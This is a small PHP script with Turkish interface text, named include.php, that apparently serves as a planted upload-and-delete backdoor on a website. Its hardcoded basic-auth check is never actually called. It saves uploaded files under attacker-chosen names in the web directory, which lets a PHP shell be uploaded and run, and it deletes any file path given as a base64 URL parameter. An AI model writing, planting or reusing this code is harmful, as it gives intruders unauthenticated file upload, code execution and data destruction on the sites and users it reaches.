<?
function giris($x,$y) {  

	if(empty($_SERVER['PHP_AUTH_USER']) || empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_USER'] != "$x" || $_SERVER['PHP_AUTH_PW'] != "$y") { 
		header('WWW-Authenticate: Basic realm="Kullanıcı adı ve şifreyi girin.."'); 
		die('İzinsiz Erişim.'); 
	}

}

if( function_exists( 'giris' ) ){ }else{ giris('temel',69845); }

if(isset($_GET['sil'])) {

	$file = base64_decode($_GET['f']);
	@unlink($file);
	echo '<pre>Dosya Silindi.</pre>';
}

if (!empty($_GET["upload"])) {
	$uploaddir ="images/";
		
	$uploadfile = $_FILES['userfile']['name'];
	//$ext = explode('.',$uploadfile);
	//$_ext = end($ext);
	//$new_name = substr(sha1(time().$uploadfile),0,11).'.'.$_ext;
	
	print "<pre>";	
	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {						
		echo "Dosya başarı ile yüklendi. ";								
	} 	else {			
		print "Dosya yüklenemedi. Tekrar deneyiniz";			
		}
	print "</pre>";
}
?>
<style>
body {
	color: #444;
	font: normal 11px Arial, Tahoma;
}
input {
	font: normal 11px Arial, Tahoma;
}
.a {
	background-color: #f2f2f2;
	padding: 4px;
	display: inline-block;
	border: 1px solid #ddd;
}
</style>
<form enctype="multipart/form-data" action="include.php?upload=1" method="post"> 
	<input type="hidden" name="MAX_FILE_SIZE" value="300000000" />
	<div class="a"><input name="userfile" type="file"/><input type="submit" value="Yükle." /></div>
</form>
<?php
echo '<strong>Diğer Dosyalar:</strong>';
foreach (glob("*.*") as $filename) {
    if($filename != 'include.php') echo "<br> - ".$filename." <a style='text-decoration: none;' href='include.php?sil&f=".base64_encode($filename)."'>(Sil)</a>";
}
?>